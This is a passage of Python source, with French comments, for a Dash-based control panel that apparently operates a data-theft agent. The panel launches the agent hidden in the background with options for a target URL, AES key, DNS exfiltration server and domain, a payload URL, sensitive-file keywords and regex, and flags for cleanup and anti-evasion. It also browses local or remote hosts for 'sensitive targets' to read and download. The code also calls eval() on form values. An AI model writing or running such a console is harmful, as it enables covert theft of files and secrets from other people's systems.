            html.Button('LAUNCH EXPLORATION', id='launch-explorer-button', n_clicks=0, style={**CYBER_BUTTON_PRIMARY, 'marginTop': '20px', 'boxShadow': '0 0 15px rgba(0,191,255,0.7)', 'backgroundColor': '#00BFFF'}),
            html.Button('STOP EXPLORATION', id='stop-explorer-button', n_clicks=0, style={**CYBER_BUTTON_DANGER, 'marginTop': '20px', 'marginLeft': '10px'}), # Nouveau bouton Stop

            html.Div(id='explorer-status', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'minHeight': '50px'}, children="INITIATE EXPLORATION TO VIEW RESULTS."),

            dash_table.DataTable(
                id='found-files-table',
                columns=[
                    {"name": "PATH", "id": "path", "presentation": "markdown"},
                    {"name": "TYPE", "id": "type"},
                    {"name": "MATCHING REGEX", "id": "sensitive_match"},
                    {"name": "ACTIONS", "id": "actions", "presentation": "markdown"}
                ],
                data=[],
                style_table={'overflowX': 'auto', 'marginTop': '20px', 'border': '1px solid #00AA22'},
                style_cell=CYBER_TABLE_CELL_STYLE,
                style_header=CYBER_TABLE_HEADER_STYLE,
                css=[
                    {"selector": ".dash-spreadsheet-menu", "rule": "font-family: 'Consolas', monospace;"},
                    {"selector": "button", "rule": "font-family: 'Consolas', monospace;"},
                ],
                style_data_conditional=[
                    {
                        'if': {'column_id': 'actions'},
                        'textAlign': 'center'
                    },
                    {
                        'if': {'filter_query': '{type} = "directory"'},
                        'backgroundColor': '#1A1A1A',
                        'color': '#FF00FF'
                    }
                ],
                page_action='none',
                sort_action='native',
                filter_action='native'
            ),

            html.Div(id='file-content-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#FFFF00', 'marginTop': '20px'}, children="SELECTED FILE CONTENT..."),
            dcc.Download(id="download-file-data"),

            html.H2(":: EXPLORER LOGS ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '30px'}),
            html.Pre(id='explorer-logs-output', style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '100px'}, children="EXPLORER LOGS WILL APPEAR HERE IN REAL-TIME..."),

        ])
    elif tab == 'tab-logs-status':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: AGENT STATUS & LOGS ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Pre(id='command-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF'}, children="AWAITING COMMANDS..."),

            html.Button('REFRESH ENCRYPTED LOGS', id='refresh-logs-button', n_clicks=0, style={**CYBER_BUTTON_SECONDARY, 'marginRight': '10px', 'marginTop': '20px'}),
            html.Button('DOWNLOAD RAW LOGS', id='download-logs-button', n_clicks=0, style={**CYBER_BUTTON_SECONDARY, 'marginTop': '20px'}),
            dcc.Download(id="download-logs-data"),
            html.Pre(id='decrypted-logs-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FF41', 'marginTop': '20px'}, children="DECRYPTED LOGS (IF AVAILABLE)..."),
        ])
    return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[html.H2("LOADING...", style=CYBER_SECTION_HEADER_STYLE)])


# --- Callbacks ---

@app.callback(Output('dns-options-div', 'style'), Input('exfil-method', 'value'))
def toggle_dns_options(method):
    return {'display': 'block'} if method == 'dns' else {'display': 'none'}


# --- CALLBACK DE SYNCHRONISATION : Input Visible --> Hidden Input ---
input_id_map = {
    'target-url': 'target-url-hidden', 'scan-path': 'scan-path-hidden', 'aes-key': 'aes-key-hidden',
    'exfil-method': 'exfil-method-hidden', 'dns-server': 'dns-server-hidden', 'dns-domain': 'dns-domain-hidden',
    'file-types': 'file-types-hidden', 'exclude-types': 'exclude-types-hidden', 'min-size': 'min-size-hidden',
    'max-size': 'max-size-hidden', 'keywords': 'keywords-hidden', 'regex-patterns': 'regex-patterns-hidden',
    'payload-url': 'payload-url-hidden', 'payload-path': 'payload-path-hidden', 'threads': 'threads-hidden',
    'debug-mode': 'debug-mode-hidden', 'no-clean': 'no-clean-hidden', 'no-anti-evasion': 'no-anti-evasion-hidden',
    'explorer-target-host-display': 'explorer-target-host-hidden',
    'explorer-base-path-display': 'explorer-base-path-hidden',
    'explorer-max-depth-display': 'explorer-max-depth-hidden'
}

for visible_id, hidden_id in input_id_map.items():
    if visible_id in ['debug-mode', 'no-clean', 'no-anti-evasion']:
        def create_checklist_callback(vid, hid):
            @app.callback(Output(hid, 'value'), Input(vid, 'value'), prevent_initial_call=False)
            def _update_hidden_checklist_value(value):
                return str(value) if value is not None else str([])
            return _update_hidden_checklist_value
        create_checklist_callback(visible_id, hidden_id)
    else:
        def create_input_callback(vid, hid):
            @app.callback(Output(hid, 'value'), Input(vid, 'value'), prevent_initial_call=False)
            def _update_hidden_input_value(value):
                return value
            return _update_hidden_input_value
        create_input_callback(visible_id, hidden_id)


# --- CALLBACK POUR GÉRER LE BOUTON APPLY ET LA SAUVEGARDE DE LA CONFIG ---
@app.callback(
    Output({'type': 'apply-button', 'input_id': MATCH}, 'style'),
    Input({'type': 'apply-button', 'input_id': MATCH}, 'n_clicks'),
    State({'type': 'apply-button', 'input_id': MATCH}, 'id'),
    [State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
     State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
     State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
     State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
     State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
     State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
     State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value')],
    prevent_initial_call=True
)
def apply_and_save_single_setting(n_clicks, button_id,
                                  target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                                  file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                                  payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                                  explorer_target_host, explorer_base_path, explorer_max_depth):
    if n_clicks > 0:
        input_id = button_id['input_id']

        config_to_save = {
            "aes_key": aes_key, "default_target_url": target_url, "default_scan_path": scan_path,
            "default_file_types": file_types, "default_exclude_types": exclude_types,
            "default_min_size": min_size, "default_max_size": max_size,
            "default_dns_server": dns_server, "default_dns_domain": dns_domain,
            "default_keywords": keywords, "default_regex_patterns": regex_patterns,
            "default_payload_url": payload_url, "default_payload_path": payload_path,
            "default_threads": threads,
            "default_debug_mode": eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str,
            "default_no_clean": eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str,
            "default_no_anti_evasion": eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str,
            "default_explorer_target_host": explorer_target_host,
            "default_explorer_base_path": explorer_base_path,
            "default_explorer_depth": explorer_max_depth,
            "default_exfil_method": exfil_method
        }
        save_shared_config(config_to_save)

        return CYBER_BUTTON_APPLY_ACTIVE
    return CYBER_BUTTON_APPLY


@app.callback(
    Output('save-config-button', 'children'),
    Input('save-config-button', 'n_clicks'),
    [State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
     State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
     State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
     State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
     State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
     State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
     State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value')],
    prevent_initial_call=True
)
def save_config_final(n_clicks,
                      target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                      file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                      payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                      explorer_target_host, explorer_base_path, explorer_max_depth):
    if n_clicks == 0:
        return "SAVE CONFIG"

    config_to_save = {
        "aes_key": aes_key, "default_target_url": target_url, "default_scan_path": scan_path,
        "default_file_types": file_types, "default_exclude_types": exclude_types,
        "default_min_size": min_size, "default_max_size": max_size,
        "default_dns_server": dns_server, "default_dns_domain": dns_domain,
        "default_keywords": keywords, "default_regex_patterns": regex_patterns,
        "default_payload_url": payload_url, "default_payload_path": payload_path,
        "default_threads": threads,
        "default_debug_mode": eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str,
        "default_no_clean": eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str,
        "default_no_anti_evasion": eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str,
        "default_explorer_target_host": explorer_target_host,
        "default_explorer_base_path": explorer_base_path,
        "default_explorer_depth": explorer_max_depth,
        "default_exfil_method": exfil_method
    }
    save_shared_config(config_to_save)
    return "CONFIG SAVED!"


@app.callback(
    Output('command-output', 'children'),
    Input('launch-button', 'n_clicks'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    prevent_initial_call=True
)
def launch_agent(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                 file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                 payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str):
    global running_agent_process, agent_output_buffer

    if n_clicks == 0: return html.Pre("AWAITING COMMANDS...", style=CYBER_STATUS_INFO)
    if running_agent_process and running_agent_process.poll() is None:
        return html.Pre("ERROR: AGENT ALREADY RUNNING. STOP IT FIRST.", style=CYBER_STATUS_ERROR)
    if not target_url or not aes_key:
        return html.Pre("ERROR: TARGET URL AND AES KEY ARE MANDATORY.", style=CYBER_STATUS_ERROR)
    if exfil_method == 'dns' and (not dns_server or not dns_domain):
        return html.Pre("ERROR: DNS SERVER AND DOMAIN ARE MANDATORY FOR DNS EXFILTRATION.", style=CYBER_STATUS_ERROR)

    command = [sys.executable, AGENT_PATH]
    command.extend(["--target", target_url, "--scan", scan_path, "--key", aes_key, "--method", exfil_method])
    if exfil_method == 'dns': command.extend(["--dns-server", dns_server, "--dns-domain", dns_domain])
    if file_types: command.extend(["--types", file_types])
    if exclude_types: command.extend(["--exclude-types", exclude_types])
    if min_size: command.extend(["--min-size", str(min_size)])
    if max_size: command.extend(["--max-size", str(max_size)])
    if keywords: command.extend(["--keywords", keywords])
    if regex_patterns: command.extend(["--regex-patterns", regex_patterns])
    if payload_url: command.extend(["--payload-url", payload_url])
    if payload_path: command.extend(["--payload-path", payload_path])
    if threads: command.extend(["--threads", str(threads)])

    debug_mode_list = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
    no_clean_list = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
    no_anti_evasion_list = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str

    if 'debug' in debug_mode_list: command.append("--debug")
    if 'no-clean' in no_clean_list: command.append("--no-clean")
    if 'no-anti-evasion' in no_anti_evasion_list: command.append("--no-anti-evasion")

    full_command_str = shlex.join(command)
    agent_output_buffer = [f"INITIATING COMMAND:\n{full_command_str}\n", "--- AGENT STARTING (CHECK LOGS FOR DETAILS) ---"]

    try:
        # Rediriger la sortie de l'agent vers un fichier temporaire ou /dev/null
        # pour qu'elle n'apparaisse pas dans Termux.
        # Les logs chiffrés doivent toujours être lus depuis LOG_FILE_PATH.
        # LogStreamer va capturer stdout/stderr du sous-processus si non redirigé vers DEVNULL
        # Pour le moment, nous gardons DEVNULL ici pour éviter le double affichage si LogStreamer ne gère pas les sous-processus.
        running_agent_process = subprocess.Popen(command,
                                                 stdout=subprocess.DEVNULL, # Ne pas afficher dans Termux
                                                 stderr=subprocess.DEVNULL, # Ne pas afficher dans Termux
                                                 cwd=AGENT_DIR,
                                                 preexec_fn=os.setsid
                                                 )
        agent_output_buffer.append(f"\n[INFO] AGENT LAUNCHED PID: {running_agent_process.pid}")
        agent_output_buffer.append("[INFO] AGENT RUNNING IN BACKGROUND.")
        agent_output_buffer.append("[INFO] USE 'REFRESH ENCRYPTED LOGS' BUTTON TO MONITOR ACTIVITY.")
        # Envoyer ces messages de status au LogStreamer aussi
        global_log_streamer.write("\n".join(agent_output_buffer))
        return html.Pre("\n".join(agent_output_buffer), style=CYBER_STATUS_BOX_STYLE)

    except FileNotFoundError:
        error_msg = f"ERROR: AGENT SCRIPT '{AGENT_PATH}' NOT FOUND."
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    except Exception as e:
        error_msg = f"ERROR LAUNCHING AGENT: {e}"
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

@app.callback(
    Output('stop-button', 'children'),
    Input('stop-button', 'n_clicks'),
    prevent_initial_call=True
)
def stop_agent(n_clicks):
    global running_agent_process
    if n_clicks == 0: return "STOP AGENT"
    if running_agent_process and running_agent_process.poll() is None:
        try:
            os.killpg(os.getpgid(running_agent_process.pid), signal.SIGINT)
            time.sleep(2)
            if running_agent_process.poll() is None: running_agent_process.terminate()
            time.sleep(1)
            if running_agent_process.poll() is None: running_agent_process.kill()
            running_agent_process = None
            status_msg = "AGENT TERMINATED."
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {status_msg}")
            return status_msg
        except ProcessLookupError:
            running_agent_process = None
            status_msg = "AGENT ALREADY TERMINATED OR NOT FOUND."
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {status_msg}")
            return status_msg
        except Exception as e:
            error_msg = f"ERROR TERMINATING AGENT: {e}"
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    else:
        status_msg = "NO AGENT RUNNING."
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {status_msg}")
        return status_msg

@app.callback(
    Output('decrypted-logs-output', 'children'),
    Input('refresh-logs-button', 'n_clicks'),
    State('aes-key-hidden', 'value'),
    prevent_initial_call=True
)
def refresh_decrypted_logs(n_clicks, aes_key_for_decrypt):
    if n_clicks == 0: return "DECRYPTED LOGS (IF AVAILABLE)..."
    if AES256Cipher is None:
        error_msg = "DECRYPTION FUNCTION NOT AVAILABLE (AES256Cipher module not imported)."
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    
    # On utilise _GLOBAL_MODULE_LOGGER pour lire les logs chiffrés du DISQUE, pas le LogStreamer
    # Car LogStreamer ne gère pas le déchiffrement ou l'accès au fichier log crypté.
    temp_log_cipher = None
    if aes_key_for_decrypt:
        try: temp_log_cipher = AES256Cipher(aes_key_for_decrypt)
        except Exception: 
            error_msg = "ERROR: INVALID AES KEY FOR LOG DECRYPTION. PLEASE VERIFY KEY."
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    else: 
        error_msg = "PLEASE PROVIDE AES KEY ABOVE TO DECRYPT LOGS."
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    
    if not temp_log_cipher: 
        error_msg = "FAILED TO INITIALIZE LOG DECRYPTOR WITH PROVIDED KEY."
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

    try:
        # Ici, on initialise une nouvelle instance de Logger POUR LIRE le fichier de log chiffré.
        reader_logger_class = globals().get('AgentLogger', None) 
        if reader_logger_class is None: # Si AgentLogger n'a pas été importé du tout
            error_msg = "AgentLogger class not available for reading encrypted logs."
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

        # Créer une instance temporaire de AgentLogger pour la lecture seule du fichier
        # On passe stdout_enabled=False pour ne pas qu'il pollue Termux.
        reader_logger = reader_logger_class(LOG_FILE_PATH, aes_key_for_decrypt, debug_mode=True, stdout_enabled=False)
        
        if hasattr(reader_logger, 'read_and_decrypt_logs'):
            logs = reader_logger.read_and_decrypt_logs()
        else:
            error_msg = "Logger does not support reading encrypted logs. (Missing feature in AgentLogger)."
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
            return html.Pre(error_msg, style=CYBER_STATUS_WARNING)

        if not logs:
            status_msg = "NO DECRYPTABLE LOGS FOUND OR LOGS UNREADABLE/UNCIPHERABLE. HAS AGENT RUN YET?"
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {status_msg}")
            return html.Pre(status_msg, style=CYBER_STATUS_WARNING)
        
        formatted_logs = []
        for entry in logs:
            formatted_logs.append(f"[{entry.get('timestamp', 'N/A')}] {entry.get('level', 'N/A')}: {entry.get('message', 'N/A')}")
        
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Logs chiffrés rafraîchis et déchiffrés.")
        return html.Pre("\n".join(formatted_logs), style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FF41'})
    except Exception as e:
        error_msg = f"ERROR REFRESHING/DECRYPTING LOGS: {e}. IS AES KEY CORRECT OR LOG FILE CORRUPTED?"
        global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

@app.callback(Output("download-logs-data", "data"), Input("download-logs-button", "n_clicks"), prevent_initial_call=True)
def download_logs(n_clicks):
    if os.path.exists(LOG_FILE_PATH):
        try:
            with open(LOG_FILE_PATH, "rb") as f: content = f.read()
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Téléchargement des logs bruts demandé.")
            return dcc.send_bytes(content, "agent_logs_encrypted.enc")
        except Exception as e: 
            error_msg = f"ERROR READING LOG FILE FOR DOWNLOAD: {e}"
            global_log_streamer.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {error_msg}")
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    return None

# --- Callbacks pour l'explorateur de fichiers ---

@app.callback(
    [Output('explorer-status', 'children'),
     Output('found-files-table', 'data'),
     Output('file-content-output', 'children')],
    [Input('launch-explorer-button', 'n_clicks'),
     Input({'type': 'read-file-button', 'index': ALL}, 'n_clicks')],
    [State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value'),
     State('found-files-table', 'data')],
    prevent_initial_call=True
)
def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, base_path, max_depth, table_data):
    ctx = dash.callback_context

    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate

    trigger_id = ctx.triggered[0]['prop_id']

    if 'launch-explorer-button' in trigger_id:
        # Effacer le buffer de logs du LogStreamer pour une nouvelle exploration
        global_log_streamer.clear_logs()
        explorer_log_states['file_explorer']['last_index'] = 0 # Réinitialise l'index de lecture

        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Démarrage de l'exploration via l'interface.")

        if isinstance(global_file_explorer, BaseMockExplorer) or isinstance(global_web_explorer, BaseMockExplorer):
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: Explorer modules not loaded (using mock implementations). Check server console for import errors.")
            return html.Pre("ERROR: Explorer modules not loaded (using mock implementations). Check server console for import errors.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        if not target_host and not base_path:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: Either TARGET HOST (URL/IP) or BASE PATH is mandatory for exploration.")
            return html.Pre("ERROR: Either TARGET HOST (URL/IP) or BASE PATH is mandatory for exploration.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        if max_depth is None or max_depth < 0:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: Please specify a valid MAX DEPTH (integer >= 0).")
            return html.Pre("ERROR: PLEASE SPECIFY A VALID MAX DEPTH (INTEGER >= 0).", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        global_file_explorer.reset_state()
        global_web_explorer.reset_state() # Réinitialiser l'état des explorateurs

        is_web_exploration = False
        if target_host and (target_host.startswith("http://") or target_host.startswith("https://") or
                           (re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_host) and not base_path) or
                           (re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target_host) and '/' not in target_host and not base_path)):
            is_web_exploration = True
            if not target_host.startswith("http"):
                target_host = "http://" + target_host


        found_targets = []
        status_message = ""

        try:
            if is_web_exploration:
                target_url_for_web = target_host
                if base_path:
                    from urllib.parse import urljoin # Importation locale pour éviter un import global si non nécessaire
                    target_url_for_web = urljoin(target_host, base_path.lstrip('/'))

                status_message = html.Pre(f"INITIATING WEB EXPLORATION OF '{target_url_for_web}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {status_message.children}")
                found_targets = global_web_explorer.explore_url(target_url_for_web, max_depth)

            else:
                if not base_path:
                     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: For local exploration, a BASE PATH is required.")
                     return html.Pre("ERROR: For local exploration, a BASE PATH is required.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

                if not os.path.isdir(base_path):
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: LOCAL BASE PATH '{base_path}' DOES NOT EXIST OR IS NOT A DIRECTORY.")
                    return html.Pre(f"ERROR: LOCAL BASE PATH '{base_path}' DOES NOT EXIST OR IS NOT A DIRECTORY.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

                status_message = html.Pre(f"INITIATING LOCAL FILE EXPLORATION OF '{base_path}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {status_message.children}")
                found_targets = global_file_explorer.explore_path(base_path, max_depth)

            if not found_targets:
                final_status = html.Pre(f"EXPLORATION COMPLETE. NO SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_WARNING)
            else:
                final_status = html.Pre(f"EXPLORATION COMPLETE. {len(found_targets)} SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_BOX_STYLE)
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] {final_status.children}")

            table_data = []
            file_type_enum = OriginalFileExplorer.TARGET_TYPE_FILE if not is_web_exploration else OriginalWebExplorer.TARGET_TYPE_FILE
            dir_type_enum = OriginalFileExplorer.TARGET_TYPE_DIRECTORY if not is_web_exploration else OriginalWebExplorer.TARGET_TYPE_DIRECTORY

            for i, item in enumerate(found_targets):
                actions_html_children = []

                is_actionable_file = False
                if item['type'] == file_type_enum:
                    is_actionable_file = True

                if is_actionable_file:
                    read_button_id = json.dumps({'type': 'read-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})
                    download_button_id = json.dumps({'type': 'download-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})

                    actions_html_children.append(
                        html.Button('READ', id=read_button_id, n_clicks=0, style=CYBER_ACTION_BUTTON_TABLE_STYLE)
                    )
                    actions_html_children.append(
                        html.Button('DOWNLOAD', id=download_button_id, n_clicks=0, style=CYBER_DOWNLOAD_BUTTON_TABLE_STYLE)
                    )
                elif item['type'] == dir_type_enum:
                    actions_html_children.append(
                        html.Span("DIR", style={'color': '#FF00FF', 'fontWeight': 'bold'})
                    )

                table_data.append({
                    "path": item['path'],
                    "full_path": item['full_path'],
                    "type": item['type'],
                    "sensitive_match": item['sensitive_match'],
                    "actions": html.Div(actions_html_children).to_plotly_json()
                })

            return final_status, table_data, html.Pre("SELECTED FILE CONTENT...", style=CYBER_STATUS_WARNING)

        except Exception as e:
            import traceback
            error_trace = traceback.format_exc()
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR EXPLORING: {e}\n{error_trace}")
            return html.Pre(f"ERROR EXPLORING: {e}\n{error_trace}", style=CYBER_STATUS_ERROR), [], html.Pre("SELECTED FILE CONTENT...", style=CYBER_STATUS_WARNING)

    elif 'read-file-button' in trigger_id:
        button_id_dict = json.loads(trigger_id)
        clicked_index = button_id_dict['index']
        source_type = button_id_dict.get('source', 'local')

        if clicked_index is not None and clicked_index < len(table_data):
            file_item = table_data[clicked_index]
            file_full_path = file_item.get('full_path')

            if file_full_path:
                content = ""
                try:
                    if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
                        content = global_file_explorer.read_file_content(file_full_path)
                    elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
                        content = global_web_explorer.read_file_content_from_url(file_full_path)
                    else:
                        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR: Explorer for '{source_type}' not available or in mock mode.")
                        return dash.no_update, dash.no_update, html.Pre("ERROR: Explorer not available for this source type or in mock mode.", style=CYBER_STATUS_ERROR)

                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Reading content of '{file_item['path']}'.")
                    return dash.no_update, dash.no_update, html.Pre(f"CONTENT OF '{file_item['path']}':\n\n{content}", style=CYBER_STATUS_WARNING)
                except Exception as e:
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Error reading file content '{file_full_path}': {e}")
                    return dash.no_update, dash.no_update, html.Pre(f"ERROR READING FILE CONTENT: {e}", style=CYBER_STATUS_ERROR)

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] FILE PATH NOT FOUND IN TABLE DATA for read action.")
            return dash.no_update, dash.no_update, html.Pre("FILE PATH NOT FOUND IN TABLE DATA.", style=CYBER_STATUS_ERROR)
        return dash.no_update, dash.no_update, dash.no_update

    return dash.no_update, dash.no_update, dash.no_update


@app.callback(
    Output('explorer-status', 'children', allow_duplicate=True), # Autoriser les doublons pour ce cas
    Output('found-files-table', 'data', allow_duplicate=True),   # Autoriser les doublons pour ce cas
    Output('file-content-output', 'children', allow_duplicate=True), # Autoriser les doublons pour ce cas
    Input('stop-explorer-button', 'n_clicks'),
    prevent_initial_call=True
)
def stop_explorer(n_clicks):
    if n_clicks > 0:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Arrêt de l'exploration demandé par l'utilisateur.")
        global_file_explorer.reset_state()
        global_web_explorer.reset_state()
        global_log_streamer.clear_logs() # Vider le buffer du LogStreamer
        explorer_log_states['file_explorer']['last_index'] = 0 # Réinitialise l'index de lecture

        return (
            html.Pre("EXPLORATION TERMINATED BY USER. RESULTS CLEARED.", style=CYBER_STATUS_INFO),
            [], # Clear table data
            html.Pre("SELECTED FILE CONTENT...", style=CYBER_STATUS_WARNING) # Clear file content
        )
    return dash.no_update, dash.no_update, dash.no_update


@app.callback(
    Output("download-file-data", "data"),
    Input({'type': 'download-file-button', 'index': ALL}, 'n_clicks'),
    State('found-files-table', 'data'),
    prevent_initial_call=True
)
def download_file(download_n_clicks_list, table_data):
    if not any(download_n_clicks_list):
        raise dash.exceptions.PreventUpdate

    ctx = dash.callback_context
    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate

    trigger_id_dict = json.loads(ctx.triggered[0]['prop_id'])
    clicked_index = trigger_id_dict['index']
    source_type = trigger_id_dict.get('source', 'local')

    if clicked_index is not None and clicked_index < len(table_data):
        file_item = table_data[clicked_index]
        file_full_path = file_item.get('full_path')

        if file_full_path:
